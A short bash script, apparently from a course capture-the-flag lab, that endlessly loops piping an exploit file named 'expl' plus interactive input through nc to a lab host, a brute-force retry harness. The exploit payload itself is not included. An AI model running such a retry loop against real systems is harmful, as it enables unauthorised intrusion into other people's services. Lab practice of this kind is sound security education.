#!/bin/bash -i
i=0
while true
do
	echo -n "attempt $i"
	let i++
	cat expl - | nc cs4401shell2.walls.ninja 14159
done
